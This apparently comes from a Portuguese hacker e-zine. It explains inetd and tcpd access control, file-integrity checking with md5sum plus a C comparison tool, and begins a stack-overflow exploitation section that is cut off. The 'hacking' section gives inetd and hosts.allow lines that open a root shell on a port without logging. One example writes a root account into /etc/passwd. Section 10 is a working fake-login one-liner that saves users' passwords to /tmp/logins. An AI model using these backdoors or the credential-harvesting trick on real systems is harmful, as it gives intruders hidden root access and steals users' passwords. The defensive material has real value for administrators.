<protocolo> Nome do protocolo em que o servico sera rodado. Ex: tcp, udp.
            Os protocolos estao listados no arquivo /etc/protocols.
            Os protocolos tcp e udp aceitam a versao do protocolo IP. Para 
            utilizar IPv4 com tcp use tcp4; IPv6, tcp6.
<espera>    Indica se o inetd deve esperar o programa servidor retornar ou 
            continuar processando conexoes no socket. Este campo recebe 
            apenas 2 valores: wait ou nowait.
<usuario>   Contem o nome do usuario que ira' rodar o programa servidor.
            Junto a este campo pode ser especificado um grupo para o qual 
            o programa estara' sendo rodado. O grupo deve ser separado por
            um ponto(.) ou dois pontos(:). ex: nobody.tty
<programa>  Eh o caminho do programa servidor. ex: /usr/sbin/in.ftpd.
<argumentos> Inicia-se sempre pelo nome do programa, seguindo seus 
             argumentos aos quais o programa deve ser inicializado. 

   Alguns exemplos de como ficam as linhas:

ftp    stream  tcp     nowait  root    /usr/sbin/tcpd  in.ftpd -l -a
telnet stream  tcp     nowait  root    /usr/sbin/tcpd  in.telnetd
pop3   stream  tcp     nowait  root    /usr/sbin/tcpd ipop3d


   Pelo inetd tambem e' possivel configurar servicos RPC (remote procedure 
calls). Pouca coisa muda na sintaxe das linhas de configuracao:

<nome/versao> <socket> <rpc/protocolo> <espera> <usuario> <programa> <args>

   O que mudou aqui foi no nome do servico, tambem e' possivel especificar 
a versao do servico. A versao pode ser um numero fixo ou um range. O nome 
do servico tem que ser um nome valido que esteja no arquivo /etc/rpc.
   Quanto ao protocolo: antes de especificar o protocolo deve ter indicado 
que o servico de' rpc. Portanto um servico rodando em tcp ficaria "rpc/tcp".
   O resto eh tudo igual.




  1.2 INTERNAL SERVICES
###########################

   Alem destes, o inetd tambem oferece alguns servicos internos nos 
protocolos tcp e udp, que podem ser ativados pelo mesmo arquivo de 
configuracao. Estes sao:

   Echo (port 7): Nada mais que um echo remoto.
echo   stream  tcp     nowait  root    internal
echo   dgram   udp     wait    root    internal

   Discard (port 9): Ignora (discarta) tudo o que eh enviado.
discard stream tcp     nowait  root    internal
discard dgram  udp     wait    root    internal

   CharGen (port 19): Gerador de caracteres.
chargen stream tcp     nowait  root    internal
chargen dgram  udp     wait    root    internal

   DayTime (port 13): Horario em forma legivel a humanos.
daytime stream tcp     nowait  root    internal
daytime dgram  udp     wait    root    internal

   Time (port 37): Horario legivel `a maquina. Na forma de numero de 
                   segundos desde 1/1/1900.
time   stream  tcp     nowait  root    internal
time   dgram   udp     wait    root    internal


   Como voce deve ter notado, a diferenca aqui e' que nao eh preciso 
indicar o programa servidor nem argumentos, pois quem serve estes servicos 
eh o proprio inetd.




  1.3 REINICIANDO
#####################

   Para desativar algum servico basta comentar a linha (colocando um # no 
inicio dela) ou simplesmente deleta-la. Depois disto basta reiniciar o 
inetd para que o servico esteje desativado.
   Reiniciar o inetd pode ser feito simplesmente enviando um SIGHUP para o 
programa ou matando o processo e comeca-lo dinovo.

root@localhost# killall -HUP inetd
ou
root@localhost# killall inetd
root@localhost# inetd





  2. TCPD
#############

   A maioria dos servicos de internet que sao gerenciados pelo inetd 
passam antes pelo tcpd para controle. Tcpd eh um programa que monitora 
requisicoes para os servicos que forem especificados. Todos os acessos que 
passarem por ele serao checados e logados.



  2.1 LOGS
##############

   O log dos acessos eh feito pelo syslog e contem a hora do acesso o host 
do cliente e o servico requisitado. Para saber em qual arquivo os logs sao 
salvos procure nas configuracoes do syslog (/etc/syslog.conf):

authpriv.*;auth.*                                       /var/log/secure

   Um exemplo de log dos acessos eh:

Mar 16 19:56:59 struck in.telnetd[1577]: connect from 127.0.0.1
Mar 16 19:57:03 struck netstat[1579]: connect from 127.0.0.1
Mar 16 19:57:03 struck in.telnetd[1580]: connect from 127.0.0.1
Mar 16 19:57:04 struck in.pop3d[1583]: connect from 127.0.0.1




  2.2 CONTROLE DE ACESSO
############################

   Uma das funcoes do tcpd eh checar o hostname do cliente que esta 
tentando conectar-se. Se o hostname nao bater com o ip da origem da 
conexao, o tcpd fecha a conexao. Isso eh muito util para aumentar a 
seguranca de servicos como rlogin, rsh em que a autenticacao eh feita 
atravez do hostname. Tambem evita ataques de host spoofing.
   Outra funcao e talvez uma das mais importantes eh o controle de acesso 
que pode-se fazer pelo tcpd. Esse controle eh feito basicamente atravez de 
dois arquivos:

/etc/hosts.allow   - Garante acesso aos clientes nos daemons especificados.
/etc/hosts.deny    - Impede o acesso caso o cliente/daemon estejam aki.

   Caso o cliente e o daemon nao estejam especificados em nenhum dos dois 
arquivos, o acesso eh permitido. O mesmo ocorre caso nao existam os 
arquivos.




  2.2.1 ARQUIVOS DE ACESSO
##############################

   Comentarios nestes arquivos sao feitos com # no inicio da linha.
   A sintaxe das linhas de controle eh:

   <daemons> : <clientes> [ : opcoes : opcoes : ... ]

   Onde:
<daemons>   Eh a lista de um ou mais nomes de daemons. O nome do daemon 
            refere-se ao nome do programa que gera o servico.
<clientes>  Lista de um ou mais enderecos de clientes que terao acesso aos 
            daemons especificados.
[opcoes]    Sao opcoes extras que serao executadas caso algum cliente da
            lista acesse algum daemon da lista. Veremos isso mais tarde 
            com maiores detalhes.

   As listas devem ser criadas separando os daemons ou os clientes por 
virgulas (,) ou espacos em branco.



  2.2.2 EXEMPLOS DE LISTAS
##############################

   Exemplos de listas de clientes:

   *  Aki fazemos uma lista com 3 maquinas do dominio alfa.net:
      user1.alfa.net, user2.alfa.net, user3.alfa.net

   *  Mas se alfa.net possui 100 maquinas e queremos colocar todas na 
      lista? Basta colocarmos o fim do host comecando por um ponto (.):
      .alfa.net

   *  Imagine que o ip das maquinas alfa.net seja 200.21.5.*. Entao tambem 
      podemos coloca-los deste modo na lista:
      200.21.5.

   *  Strings comecadas por @ referen-se a grupos NIS:
      @hackers

   *  Qualquer string na forma "n.n.n.n/m.m.m.m" e' interpretada como 
      addr/mask:
      127.0.0.0/255.0.0.0


   Exemplo de lista de daemons:

   *  Nao tem mto o que falar, apenas coloque os nomes dos programas que 
      fazem o servico:
      in.ftpd, in.telnetd, in.pop3d



   2.2.3 WILDCARDS
######################

   Sao palavras chaves que a linguagem de controle de acesso suporta.

   *  ALL
      Todos os clientes ou todos os daemons.

   *  LOCAL
      Todo o host que nao tiver ponto (.).

   *  UNKNOWN
      Todos os hosts que forem desconhecidos (nao conseguirem ser catados 
      no nameserver). Problemas no nameserver pode tirar (ou dar) acesso a 
      maquinas que nao deveriam.

   *  KNOWN
      Todos os hosts que forem conhecidos. Mesmo problema anterior.

   *  PARANOID
      Todos os hosts que nao baterem com seu endereco. Caso de spoofs.

   *  EXCEPT
      Eh utilizado nas listas de hosts e daemons para indicar excecao. 
      Pode-se utilizar parenteses para indicar prioridade. Exs:
      ALL EXCEPT in.ftp
      ALL EXCEPT (200.10.3. EXCEPT 200.10.3.44)



  2.2.4 OPCOES EXTRAS
#########################

   Estas opcoes podem ser colocadas apos a lista de clientes, separadas 
por dois pontos (:). Qualquer erro de sintaxe sera reportado pelo syslog.
   Caso nenhuma palavra-chave de opcao seja encontrada, o que estiver 
depois dos dois pontos sera interpretado como um comando de shell.
   As opcoes sao as seguintes:

   * SEVERITY
     Muda o nivel de severidade com que o evento sera logado.
     ex: in.ftpd: ALL: SEVERITY

   * ALLOW
     Permite acesso da maquina ao servico.
     ex: ALL: .com.br: ALLOW

   * DENY
     Impede o acesso da maquina ao servico.
     Com estas duas chaves eh possivel fazer o controle utilizando apenas 
     um arquivo.
     ex: in.telnetd: ALL: DENY

   * SPAWN <comando>
     Executa algum comando de shell num processo filho com stdin,out,err 
     apontados para /dev/null. 
     ex: in.pop3d: ALL: SPAWN /bin/echo "pop3 acessado" >> /log/pop3.log

   * TWIST <comando>
     Executa algum comando de shell com stdin,out,err apontados para a 
     conexao com o cliente.
     ex: in.ftpd: ALL: TWIST /bin/echo "421 Ftp Nao disponivel."

   * KEEPALIVE
     Faz com que o servidor envie de tempos em tempos verifique se o 
     cliente ainda esta "vivo" enviando uma msg e caso ele nao responda a 
     conexao e' fechada.

   * LINGER <segundos>
     Especifica em quanto tempo o kernel tentara' enviar um pacote que 
     ainda nao foi enviado antes de fechar a conexao.

   * BANNERS <diretorio>
     Procura pelo arquivo de banner com o mesmo nome do programa daemon 
     (por exemplo, o banner de in.ftpd sera o arquivo in.ftpd no diretorio 
     especificado). O conteudo do arquivo eh exibido assim que se 
     estabelecer a conexao.

   * NICE <numero>
     Muda o valor do nice do processo. O padrao e' 10.

   * SETENV <nome> <valor>
     Cria variaveis atribuindo um valor a elas.

   * UMASK <valor>
     Igual ao umask utilizado na shell. Define as permissoes que os 
     arquivos serao criados. 

   * USER <user>[.grupo]
     Assume privilegios do usuario especificado e do grupo caso seja 
     indicado. Isso eh bem util quando todos os servicos estao sendo 
     rodados como root no inetd.



  2.2.5 EXPANCOES
#####################

   Algumas expancoes podem ser utilizadas em conjunto com os comandos 
executados pelas opcoes twist e spawn alem de poderem ser usadas nos 
arquivos de banner ativados pela opcao banners.

%a     Endereco do cliente.
%A     Endereco do servidor.
%c     Informacoes do cliente (depende de qta informacao eh disponivel).
%s     Informacoes do servidor (depende ...).
%d     Nome do programa de daemon.
%h     Hostname do cliente (se indisponivel, ip).
%H     Hostname do servidor (se indisponivel, ip).
%n     Hostname do cliente (se indisponivel, "unknown" ou "paranoid").
%N     Hostname do servidor (se indisponivel, "unknown" ou "paranoid").
%p     Process id do daemon.
%u     Username do cliente (ou "unknown").
%%     Caractere '%'.



  2.2.6 EXEMPLOS DE SISTEMAS FECHADOS
#########################################

   Sistemas fechados sao aqueles que restrigem todos seus servicos apenas 
para clientes especiais (trusted hosts). A primeira linha que 
encontraremos aqui eh:

/etc/hosts.deny:
  ALL:ALL

   Isso fecha todos os servicos a todos. Como /etc/hosts.allow tem 
prioridade no controle de acesso, agora basta criar a lista de trusted 
hosts e de servicos disponiveis nele:

/etc/hosts.allow:
  ALL: LOCAL
  in.ftpd: .pucrs.br EXCEPT vaccaro.pucrs.br

   Estas linhas dao acesso local a todos os servicos e acesso ao ftp a 
maquinas da pucrs.br com excecao da vaccaro.pucrs.br.




  2.2.7 EXEMPLOS DE SISTEMAS ABERTOS
########################################

   Sistemas abertos sao akeles que deixam qquer cliente usufluir de seus 
servicos. Neles ocorre o inverso dos sistemas fechados...

/etc/hosts.allow:
  ALL:ALL

   Com isso todas as maquinas na rede podem utilizar todos os seus 
servicos. Mas ae voce notou que alguns clientes mal intencionados estao 
tentando lhe hackear pelo ftpd por exemplo... Imagine tambem que voce esta 
atualizando seu pop3 e nao quer correr riscos enquanto ele esta rodando...

/etc/hosts.deny:
  in.ftpd: hacker.de.ftp.com.br
  in.pop3d: ALL




  2.2.8 EXEMPLOS DE TRUQUES
###############################

   A proxima linha serve para barrar acessos de algum hacker a todos seus 
servicos alem de dar um susto nele.

/etc/hosts.deny:
   ALL: addr.do.hacker.com.br: TWIST /bin/echo "Seu ip (%a) esta em meus 
                               logs seu hacker de merda! Estou ligando 
                               para seu provedor agora..."


   Outra truque interessante eh colocar estes arquivos para executar 
programas ou shellscripts que simulem alguma besteira qquer... tipo...
 
in.ftpd : ALL : TWIST /root/sec.sh %a

---sec.sh---
#!/bin/sh
echo "root@localhost# ./0dayxplt $1"
echo "Trying root $1..."
echo "Use Address: 0xbfff13a8"
sleep 2
echo "Done!"
echo "bash# (rm -rf / )&"
echo "bash# exit"
echo "root@localhost#"
---sec.sh---

   Bom.. use a imaginacao...
   Se quizer criar novos logs pode usar:

ALL: ALL: SPAWN /bin/echo "%h(%a) acessou %d[%p]" >> /var/log/mylogs

   Etc... Etc...



  2.3 TCPDCHK
#################

   Tcpdchk eh um programa que checka se seus arquivos de controle estao 
com qquer problema, desde hosts nao resolvidos ateh erros de sintaxes. Eh 
bem util para resolver alguns problemas nestes arquivos...
   Opcoes:

-a     Reporta todas as linhas que dao acesso a alguma maquina sem 
       utilizar a opcao ALLOW.

-d     Examina os arquivos hosts.allow e hosts.deny no diretorio atual.

-i <file>   Indica a localizacao do arquivo inetd.conf que sera examinado.

-v     Verbose mode.



  2.4 TCPDMATCH
###################

   Eh bastante usado em servidores que abusam destes arquivos de controle. 
Ele procura por referencias dos daemons e dos clientes nos arquivos de 
controle. Por exemplo... c voce quer verificar se o cliente lama.com tem 
acesso ao seu ftp:

[root@struck /etc]# tcpdmatch in.ftpd lama.com
warning: host name/name mismatch: www.lama.com != lama.com
client:   hostname paranoid
client:   address  206.117.145.175
server:   process  in.ftpd
matched:  /etc/hosts.deny line 11
option:   TWIST /etc/sec.sh 206.117.145.175
access:   delegated


   Como pode ver acima, o tcpdwatch faz uma busca completa, informa se o 
endereco eh do tipo paranoid ou unknown, informa o ip, a linha em que 
alguma referencia foi encontrada, as opcoes utilizadas, e o tipo de 
acesso. Eh otimo para buscas rapidas nestes arquivos qdo eles esta meio 
grandinhos...
   Opcoes:

-d          Examina o hosts.allow e hosts.deny no diretorio atual.

-i <file>   Indica a localizacao do arquivo inetd.conf que sera examinado.



  3. HACKING
################

   Bom... as "falhas" nestes daemons ja sao conhecidas de edicoes 
anteriores da fatal 3rror... Elas permitem que usuarios que ja obtiveram 
acesso de nivel root criem backdoores muito facilmente.
   A primeira pode ser encontrada no arquivo /etc/inetd.conf:

/etc/inetd.conf:
  gopher  stream  tcp     nowait  root    /usr/sbin/tcpd  /bin/sh -i

   Com isso a porta que esta reservada ao servico gopher (70) na verdade 
rodara uma shell com nivel root. O nome do servico pode ser qualquer um 
que ja exista no arquivo /etc/services. Pode tambem criar um servico 
editando este arquivo...

/etc/services:
  back           31337/tcp
/etc/inetd.conf:
  back  stream  tcp     nowait  root    /usr/sbin/tcpd  /bin/sh -i


   Porem note que as duas vezes usamos o tcpd para rodar nossa backdoor. 
Isso gera logs...

/var/log/secure:
  Mar 18 03:45:13 struck sh[1073]: connect from 127.0.0.1

   Como nenhum hacker vai querer aparecer nos logs, tiraremos o tcpd da 
jogada. A linh entao muda para:

/etc/inetd.conf:
  back  stream  tcp     nowait  root    /bin/sh  /bin/sh -i

   Pronto... agora nada de logs...
   Tambem eh possivel criar backdoores utilizando os arquivos de 
controle... para isso voce pode fazer:

in.ftpd: seu.endereco.com: TWIST /bin/sh -i

   Nao importa que seja no hosts.allow ou no hosts.deny... sempre que 
voce acessar o servico de ftp vai cair numa shell.



  4. SECURITY
#################

   Bem... sobre seguranca nao ha muito o que falar... apenas fique de olho 
nos logs e controle o acesso de pessoas que persistem em te encher o saco.
   Soh um toque que vou dar aqui pode se tornar bem util para alguns 
admins analistas de seguranca q nao tem confianca na seguranca de seus 
daemons. Ja pensaram em roda-los a um uid mais baixo?? 
   Por exemplo:

ftp     stream  tcp     nowait  nobody  /usr/sbin/tcpd  in.ftpd -l -a

   Note que o daemon de ftp eh rodado com privilegios de nobody... assim 
qdo o daemon for exploitado, resultara em uma shell de uid 65535 ou o uid 
que nobody recebe na sua maquina.
   Isso ae... acabar por aki esse texto, ja que virei a noite toda 
escrevendo-o e agora sao 7:00 da manha e vou pro mar (durmir pra que 
neh?).











        _xXXXP^''                             ``^YXXXx_
     _xXXXXP~            09 - Checksums           ~YXXXXx_
  _xXXXXXX(                                         )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                                         )XXXXXXP~
     ~YXXXXb_                mild7               _dXXXXP~
        ~YXXXbx..                             ..xdXXXP~


----------------------------------- 
| Somas de Verificacao (CheckSums)| 
-----------------------------------

Iae.. vou falar alguma coisa sobre somas de verficacao, as chamadas 
CheckSums, abordando principalmente o algoritmo MD5, que eh um dos melhores e 
mais seguros que tem por ae.. tah, vambora..



..: O que sao checksums? ::.

Uma checksum (em portugues, 'Somas de Verificacao') eh uma string gerada por 
algum algoritmo matematico para fins de comparacao. Com ela, tu pode 
verificar se dois arquivos sao realmente identicos, o que pode ser muito 
complicado (e MUITO falho) de se fazer a oio nu ou usando algum outro sistema 
de comparacao de arquivos, pois ateh mesmo a alteracaum de um misero bit do 
arquivo faz com que o algoritmo gere checksums completamente diferentes.



.:: Tah, e daih? ::.

Vamos a uma situacaum qqer. Imaginacao fertil!

" Uma certa noite, em suas viagens pela Brasnerd, voce conhece Fulaninho. 
Apos muito papo sobre linux e punheta (nao necessariamente nessa ordem), voce 
descobre que fulaninho, alem de ser um kra legal, manja muito bem de linux. 
Entao vc passa a conversar com ele seguidamente, pois Fulaninho EH um kra 
legal! Ele saca muito de atques remotos e, de quebra, eh coder C. Que legal! 
Um novo amigo! "

" No fim de semana, voce recebe uma mensagem da BugTraq dizendo que o mais 
novo patch do sendmail jah estah disponivel, pois foi descoberdo um bug 0day 
que precisa imediatamente ser patcheado. Logo apos essa mensagem chegar, 
chega uma mensagem de seu grande amigo Fulaninho, que eh solidario com voce e 
jah encaminhou pro seu email os binarios do novo patch publicado naquele dia. 
Como voce eh feliz! Tem um amigo de verdade! "

" Inocente, voce compila e instala o patch. O sendmail estah atualizado! Sem 
notar, voce instalou junto uma backdoor que dah a Fulaninho acesso r00t ao 
seu querido linux. Que amigo! "

duh... que historinha imbecil... mas foi pra ilustrar o que poderia ser 
evitado se o babaquinha ae em cima fosse mais cuidadoso. Primeiro, ele 
poderia ter dado uma olhada nos fontes enviados por Fulaninho, e ter 
verificado que acoes realmente aqueles fontes fariam em seu sistema quando 
compilados. Mas... e se o usuario nao soubesse codar? Simples... ele poderia 
simplesmente gerar uma checksum para o arquivo enviado pelo "amigo", ir ateh 
o site de distribuicao indicado pela mensagem da lista e comparar as duas 
somas... se fossem identicas, muito bem, Fulaninho estava sendo honesto e 
solidario. Mas na situacao acima, os arquivos teriam checksums totalmente 
diferentes, pois Fulaninho havia inserido uma backdoor no meio do patch 
enviado ao nooso amigo duhzinho. Com isso, o idiota chegaria a brilhante 
conclusao de que os arquivos nao eram identicos...



.:: Ah, entendi!! ::.

Entendeu? Foi soh um exemplo para ilustrar um uso produtivo de uma soma de 
verificacao, que evitaria nosso usuario de ser infectado por um arquivo 
adulterado. Mas... coloque sua cabeca pra funcionar e pense nas 
possibilidades disso tudo...



.:: MD5 ::.

O md5sum, que gera as checksum com algoritmo MD5 para os arquivos estah 
presente em qq distribuicaum linux. Mesmo assim existem outros programas que 
geram checksums, com o adicional de poderem usar mais de um algoritmo para a 
criao de somas. Eis:

AIDE 
---- 
Este software eh bem completo e tem algumas outras funcoes alem de 
gerar checksums. Trabalha com os algoritmos md5, sha1, md160, tiger, crc32, 
haval e gost. Site: http://www.cs.tut.fi/~rammer/aide.html

Tripwire 
-------- 
Este, mais famoso e tradicional, dah suporte aos algoritmos 
md5, Snefru, CRC-32, CRC-16, md4, md2, sha/shs e haval. Cate ele: 
http://tripwire.org

-> Mas neste texto, vamos usar somento o nosso amigo md5sum, ok?
   
   ~# md5sum <nome_do_arquivo>
   Cria uma checksum para o arquivo e a exibe na tela.

   ~# md5sum <nome_do_arquivo> > checksum
   Ao inves de exibir a checksum do tal arquivo na tela, ele a
   coloca no arquivo checksum (no exemplo).

   ~# md5sum <diretorio>/* > list
   Se voce colocar um diretorio como o /bin, vai ficar uma coisa parecida
   com isso: md5sum /bin/* > list. Isto gera uma checksum para todos os
   arquivos da pasta especificada. Muito interessante para ser combinado
   com o programa de comparacao de listas md5 criado pelo struck (mais
   abaixo).



.:: So, Lets go! ::.

Vamos criar dois programinhas bem simplezinhus na pasta /root para comecarmos 
nossas atividades.. issu ae:


//exemple1.c

#include <stdio.h>

void main() 
 { 
 system("/sbin/shutdown -r now"); 
 }

//fim do exemple1.c


Aqui criamos um simples programa que usa uma system() para economizar os 
dedos do r00t e reiniciar o sistema. Compilemos:

~# gcc exemplo.c -o exemplo1

Se executarmos, o sistema reiniciara. Mas o r00t nao eh troxa, e fez o 
seguinte:

~# md5sum /root/exemplo1 <enter> c
433ace784beaa9c83e2fa3c2aaba6b1 exemplo1

Tah vendo esta grande string na linha, antes do nome do programa? Eh a 
checksum gerada pelo algoritmo MD5 (md5sum), que o r00t guardou em um banco 
de dados e, de preferencia, em uma midia removivel (CD-ROM, floppy). Veja 
bem, esta checksum eh UNICA para esse arquivo, e qualquer bit que seja 
alterado nele, a checksum mudarah completamente. Eh o que veremos agora.

Digamos que um lammah conseguiu acesso a esse sistema e, tomando conhecimento 
do programa de desligamento do root, instalou ali uma backdoor imbecil para 
garantir seu acesso futuro. Veja o que o h4x0r fez:


//exemplo2.c

#include <stdio.h>

void main() 
 { 
 system("echo r00t::0:0:r00t:/root:/bin/sh > /etc/passwd"); 
 system("/sbin/shutdown -r now"); 
 }

//fim do exemplo2.c


o que nosso amigo fez? Adicionou uma system() ao programa do root que 
adiciona uma nova conta r00t com userid=0 (superusuario) no /etc/passwd. 
Vamos compila-lo:

~# gcc exemplo2.c -o exemplo1

E assim o grande invasor instalou uma simples backdoor no sistema. Substituiu 
o programa legitimo por sua versao adulterada. Mas... tchanammm! O root tem 
sua checksum legitima guardada!! Assim que ele comecar a desconfiar de algo, 
pode comecar a comparar suas checksums com as atuais do sistema. Ele faz a 
seguinte verificacao:

~# md5sum exemplo1 
932e92055b8e9d1daa90154e3ffa82cf exemplo1

Para sua surpresa, ao fazer a comparacao das checksums, ele descobriu que 
aquele arquivo nao era mais legitimo! O instrumento usado pelo invasor foi 
desmascaradu.

Assim como o root fez uma checksum para seu arquivo legitimo exemple1, ele 
DEVE ter feito checksums para outros arquivos vitais do sistema e que sao 
alvos frequentes de alteracao de algum usuario mal-intencionado:

/etc/passwd 
/etc/shadow 
/etc/group 
/etc/hosts.allow 
/etc/hosts.deny 
/etc/inittab 
/bin/sh 
/bin/bash 
/bin/tcsh 
/bin/csh 
/bin/ash 
/bin/ls 
/bin/ping

e por aih vai, afim de descobrir alteracoes nao-autorizadas em arquivos que 
nao devem ser mexidos.



.:: Check Files 1.0 ::.

Para facilitar o trabalho de verificacao das checksum's (especialmente quando 
estas sao muitas, o que pode tornar-se muito entediante), o struck codou um 
programinha aki que facilita e muito a nossa vida.

O que o Check Files faz? 
Ele simplesmente compara uma lista de somas md5 antiga com uma gerada mais 
recentemente, alertando sobre a existencia de arquivos criados, deletados ou 
alterados.

Como usa-lo? 
Simples.. vamos usar o exemplo do proprio source... digamos que vc queira 
armazenar as checksums de todos os seus arquivos localizados em /etc..

~# md5sum /etc/* > check.old

Isto ira gerar um file (check.old) contendo todas elas. Ae algum tempo depois 
(algumas horas, ou 5 anos depois, como sugeriu o struck), voce gera um novo 
file com as checksums novas do seu /etc:

~# md5sum /etc/* > check.new

Ae depois de ter gerado esse file, compile o Check Files...

~# gcc chk.c -o chk

E entao, execute o programa, determinando os arquivos a serem comparados...

~# ./chk check.old check.new 
 ---DELETADO: /etc/hosts.deny
 !!!ARQUIVO ALTERADO: /etc/passwd
 !!!ARQUIVO ALTERADO: /etc/inetd.conf
 +++NOVO ARQUIVO: /etc/passwd~

Blz... deu pra ver quais foram as alteracoes em /etc! Voce pode usar esse 
programa para armazenar checksums originais de todos os seus arquivos 
pessoais se quiser, e se notar algo suspeito na makina, criar uma nova lista 
com o md5sum e compara-las com este programa. 

Importante
Voce pode gerar listas de checksums md5 para diretorios com arquivos 
binarios,como o /bin ou o /sbin... assim, ao detectar algo suspeito, voce 
pode imediatamente criar uma nova lista para esses diretorios e compara-las 
usando esse prog, pois sempre ha a possibilidade de um rootkit qualquer ter 
instalado alguma backdoor nesses diretorios.. quem nunca ouviu falar da
backdoor do PING? Ela pode ser detectada facilmente usando-se este metodo.

Vamos ao source..:

<++> checksum/chk.c
//Security Tool
/* Check files v1.0 by Cheat Struck <cheat@struck.8m.com>
 * http://struck.8m.com
 *
 *  Verifica arquivos md5 e exibe o que foi criado, deletado e alterado.
 *  Verify md5 files and shows what was created, deleted and changed.
 *
 *  Use:
 *        [root@struck /tmp]# md5sum /etc/* > etc.old
 *     (5 years later)
 *        [root@struck /tmp]# md5sum /etc/* > etc.new
 *        [root@struck /tmp]# gcc chk.c -ochk
 *        [root@struck /tmp]# ./chk etc.old etc.new
 *         ---DELETADO: /etc/aloha.test
 *         !!!ARQUIVO ALTERADO: /etc/inetd.conf
 *         !!!ARQUIVO ALTERADO: /etc/passwd
 *         +++NOVO ARQUIVO: /etc/passwd~
 *
 */


#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[]) {
   FILE *fp, *fp2;
   char *chk1, *chk2, *name1, *name2, s1[500], s2[500];

   if (argc <3) {
      printf("use: %s <old_file> <new_file>\n",argv[0]);
      exit(0);
   }
   if ((fp=fopen(argv[1],"r")) == NULL) {
      printf("erro: Nao foi possivel abrir %s.\n",argv[1]);
      exit(-1);
   }
   if ((fp2=fopen(argv[2],"r")) == NULL) {
      printf("erro: Nao foi possivel abrir %s.\n",argv[2]);
       exit(-1);
   }

   while(!feof(fp)) {
      memset(s1,'\0',sizeof(s1));
      fgets(s1,500,fp);
      if (feof(fp)) break;

      chk1=strtok(s1," ");
      name1=chk1+strlen(chk1)+2;
      memset(name1+strlen(name1)-1,'\0',1);

      if (strcmp(name1,name2)) {
         do {
            memset(s2,'\0',sizeof(s2));
            fgets(s2,500,fp2);
            if (feof(fp2)) {
               printf(" ---DELETADO: %s\n",name1);
               break;
            }

            chk2=strtok(s2," ");
            name2=chk2+strlen(chk2)+2;
            memset(name2+strlen(name2)-1,'\0',1);

            if (strcmp(name1,name2) > 0)
               printf(" +++NOVO ARQUIVO: %s\n", name2);
            else if (strcmp(name1,name2) < 0) {
               printf(" ---DELETADO: %s\n",name1);
               break;
            }
         } while(strcmp(name1,name2));
      }

      if (!strcmp(name1,name2) && strcmp(chk1,chk2))
         printf(" !!!ARQUIVO ALTERADO: %s\n",name1);
   }

   while(!feof(fp2)) {
      memset(s2,'\0',sizeof(s2));
      fgets(s2,500,fp2);
      if (feof(fp2)) break;

      chk2=strtok(s2," ");
      name2=chk2+strlen(chk2)+2;
      memset(name2+strlen(name2)-1,'\0',1);
      printf(" +++NOVO ARQUIVO: %s\n", name2);
   }

   fclose(fp);
   fclose(fp2);
   return(1);
}
<-->


.:: The end ::.

Eh isso, gurizada... esse negocio de integridade de arquivos eh mtu util pra 
detectar invasoes, mas tem muito mais... aqui soh procurei explicar mais ou 
menos como funciona... 
Dica: isso aki eu sei que mta gente jah sabe, mas nunca eh demias lembrar os 
mais esquecidos... de atributos de arquivo imutavel aos seus files mais 
preciosos... isso nao imuniza, mas eh mais um trabalho pro invasor conseguir 
te causar problema. Use chattr +i <nome_do_arquivo>. Isso faz com que ele 
nao possa ser alterado, excluido, renomeado ou linkado. 
Dica1: voce pode fazer um sistema avancado para checar a integridade dos 
arquivos do seu sistema.. ex, c pode schedular no cron um script que gere 
listas de checksums md5 para rodar em um tempo especificado, e que grave 
todas as suas checksums em um arquivo localizado em uma particao separada, 
ou mesmo burna-las em um CD-R... depois, para verificar as checksums 
guardadas com as atuais, basta usar o programa escrito pelo struck ae em 
cima e procurar por possiveis alteracoes em seus arquivos...

bote sua imaginacao pra funcionar...

falowz...

mild7 - 2002










        _xXXXP^''                             ``^YXXXx_
     _xXXXXP~       10 - Como roubar senhas       ~YXXXXx_
  _xXXXXXX(       usando uma linha de comando       )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                                         )XXXXXXP~
     ~YXXXXb_             Cheat Struck            _dXXXXP~
        ~YXXXbx..                             ..xdXXXP~

    Hehehe.. soh estou escrevendo esta materia para desmotivar o pessoal 
que fazem programas bestinhas como fake logins e ja se acham os hackoes.
    Se voce esta logado localmente em uma rede unix, ao invez de dar exit 
para sair da shell e liberar o terminal, digite o seguinte comando:


sh$ clear; echo -e "\nlogin: \c"; read LOGIN; echo -e "Password: \c"; stty 
-echo; read PASS; echo $LOGIN : $PASS >> /tmp/logins; stty echo; sleep 1; 
echo -e "\nLogin incorrect"; sleep 1; exit


   Modifique a linha de acordo com a maquina que voce esta.
   Quando voce retornar a maquina, encontrara' um login e sua respectiva 
senha no arquivo /tmp/logins.
   Facil, pratico e leeto. =)










        _xXXXP^''                             ``^YXXXx_
     _xXXXXP~      11 - Insecure Programming      ~YXXXXx_
  _xXXXXXX(                                         )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                                         )XXXXXXP~
     ~YXXXXb_             Cheat Struck            _dXXXXP~
        ~YXXXbx..                             ..xdXXXP~

   Ha algum tempo a core-sdi.org lancou um pacote de exemplos de programas 
vulneraveis a exploitting. Eu achei interessante os programas e muito 
uteis para treinar e testar seus conhecimentos, portanto decidi 
publica-los aki com seus devidos xploits.
   Bem... como esta edicao ta pra ser lancada em cima da hora (prometi pro 
fim de fevereiro), entao nao vai da pra resolver tudo de uma soh vez. Por 
tanto vou publicar apenas a solucao dos 4 primeiros programas que foi tudo 
o que eu consegui fazer esta noite (deem uma tregua... afinal eu decidi 
fazer tudo desde o shellcode ateh a explicacao do xploit).


   O primeiro programa eh um simples caso de stack overflow.
<++> insec/abo1.c
/* abo1.c                                                   *
 * specially crafted to feed your brain by gera@core-sdi.com */

/* Dumb example to let you get introduced...                */

int main(int argv,char **argc) {
        char buf[256];

        strcpy(buf,argc[1]);
}
<-->


   Como da pra notar no programa acima, o programa usa a funcao strcpy() 
que eh vulneravel pois nao verifica limite dos buffers. O tamanho do 
